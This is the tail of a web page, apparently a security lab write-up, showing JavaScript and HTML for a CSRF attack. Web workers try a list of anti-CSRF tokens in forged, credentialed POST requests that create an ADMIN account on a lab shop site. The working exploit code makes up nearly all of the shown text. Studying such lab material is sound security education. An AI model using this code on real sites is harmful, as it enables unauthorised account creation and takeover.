                <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://pwnownshop.site/add_user.php</span><span class="dl">"</span><span class="p">;</span>

                <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">tVal</span><span class="p">;</span>

                <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
                        <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">Malice</span><span class="dl">"</span><span class="p">,</span>
                        <span class="dl">"</span><span class="s2">surname</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">Smith</span><span class="dl">"</span><span class="p">,</span>
                        <span class="dl">"</span><span class="s2">email</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">malice@hacker.site</span><span class="dl">"</span><span class="p">,</span>
                        <span class="dl">"</span><span class="s2">role</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">ADMIN</span><span class="dl">"</span><span class="p">,</span>
                        <span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
                        <span class="dl">"</span><span class="s2">CSRFToken</span><span class="dl">"</span> <span class="p">:</span> <span class="nx">token</span><span class="p">,</span>
                <span class="p">};</span>
    
     
                <span class="nx">http</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
                <span class="nx">http</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">true</span><span class="dl">'</span><span class="p">;</span>
                <span class="c1">//Send the proper header information along with the request</span>
                <span class="nx">http</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
                <span class="nx">http</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                        <span class="k">if </span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="c1">//We don't care about responses</span>
                                <span class="nx">http</span><span class="p">.</span><span class="nf">abort</span><span class="p">();</span>
                        <span class="p">}</span>
                <span class="p">}</span>

         <span class="c1">//Serialize the data without using JQuery </span>
                <span class="nx">queryParams</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">keys</span><span class="p">(</span><span class="nx">params</span><span class="p">).</span><span class="nf">reduce</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">k</span><span class="p">){</span><span class="nx">a</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">k</span><span class="o">+</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="o">+</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">params</span><span class="p">[</span><span class="nx">k</span><span class="p">]));</span><span class="k">return</span> <span class="nx">a</span><span class="p">},[]).</span><span class="nf">join</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">);</span>
                <span class="nx">http</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">queryParams</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="nf">Terminator</span><span class="p">()</span> <span class="p">{</span>
                <span class="nb">self</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span> <span class="dl">"</span><span class="s2">Sir, I've finished... see you later</span><span class="dl">"</span><span class="p">);</span>
                <span class="nb">self</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
                <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// Brute Loop</span>
        <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">tokens</span><span class="p">);</span>
<span class="p">},</span> <span class="kc">false</span><span class="p">);</span> 

</code></pre></div></div>

<p>BrutePOST_worker.html:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
        <span class="nt">&lt;body&gt;</span>
                <span class="nt">&lt;h1&gt;</span>Anti-CSRF Tokens to test<span class="nt">&lt;/h1&gt;</span>
                <span class="nt">&lt;textarea</span> <span class="na">id=</span><span class="s">"tokens"</span> <span class="na">rows=</span><span class="s">"12"</span> <span class="na">cols=</span><span class="s">"60"</span><span class="nt">&gt;</span>
         00411460f7c92d2124a67ea0f4cb5f85
      <span class="nt">&lt;/textarea&gt;</span>
                <span class="nt">&lt;br&gt;</span>
                <span class="nt">&lt;h1&gt;</span>Workers results<span class="nt">&lt;/h1&gt;</span>

                <span class="nt">&lt;span</span> <span class="na">id=</span><span class="s">"workers"</span><span class="nt">&gt;&lt;/span&gt;</span>
 
                <span class="nt">&lt;script&gt;</span>
                        <span class="kd">function</span> <span class="nf">startBlock</span><span class="p">(</span><span class="nx">worker</span><span class="p">,</span> <span class="nx">tokens</span><span class="p">)</span> <span class="p">{</span>
                                <span class="nx">worker</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">({</span>
                                        <span class="dl">'</span><span class="s1">tokens</span><span class="dl">'</span> <span class="p">:</span> <span class="nx">tokens</span>
                                <span class="p">});</span>
                        <span class="p">}</span>

                        <span class="kd">var</span> <span class="nx">bruterPath</span> <span class="o">=</span><span class="dl">"</span><span class="s2">csrf.labs.bruter.js</span><span class="dl">"</span><span class="p">;</span>

                        <span class="kd">var</span> <span class="nx">ww1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Worker</span><span class="p">(</span><span class="nx">bruterPath</span><span class="p">);</span>
                        <span class="nx">ww1</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                                <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">workers</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">&lt;b&gt;ww1&lt;/b&gt; says: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;br&gt;</span><span class="dl">"</span><span class="p">;</span>
                        <span class="p">},</span> <span class="kc">false</span><span class="p">);</span>


                        <span class="kd">var</span> <span class="nx">ww2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Worker</span><span class="p">(</span><span class="nx">bruterPath</span><span class="p">);</span>
                        <span class="nx">ww2</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                                <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">workers</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">&lt;b&gt;ww2&lt;/b&gt; says: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;br&gt;</span><span class="dl">"</span><span class="p">;</span>
                        <span class="p">},</span> <span class="kc">false</span><span class="p">);</span>


                        <span class="kd">var</span> <span class="nx">ww3</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Worker</span><span class="p">(</span><span class="nx">bruterPath</span><span class="p">);</span>
                        <span class="nx">ww3</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                                <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">workers</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">&lt;b&gt;ww3&lt;/b&gt; says: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;br&gt;</span><span class="dl">"</span><span class="p">;</span>
                        <span class="p">},</span> <span class="kc">false</span><span class="p">);</span>


                        <span class="kd">var</span> <span class="nx">tokens</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">tokens</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\s</span><span class="sr">+/gm</span><span class="p">,</span> <span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
                        <span class="nx">tokens</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nb">Boolean</span><span class="p">);</span>



                        <span class="nf">startBlock</span><span class="p">(</span><span class="nx">ww1</span><span class="p">,</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">333</span><span class="p">));</span>
                        <span class="nf">startBlock</span><span class="p">(</span><span class="nx">ww2</span><span class="p">,</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">333</span><span class="p">,</span><span class="mi">666</span><span class="p">));</span>
                        <span class="nf">startBlock</span><span class="p">(</span><span class="nx">ww3</span><span class="p">,</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">666</span><span class="p">,</span><span class="nx">tokens</span><span class="p">.</span><span class="nx">length</span><span class="p">));</span>


                <span class="nt">&lt;/script&gt;</span>

                <span class="nt">&lt;div&gt;</span>
                        <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"counter.gif"</span> <span class="nt">/&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p><a href="./">back</a></p>


      </section>
    </div>
  </body>
</html>
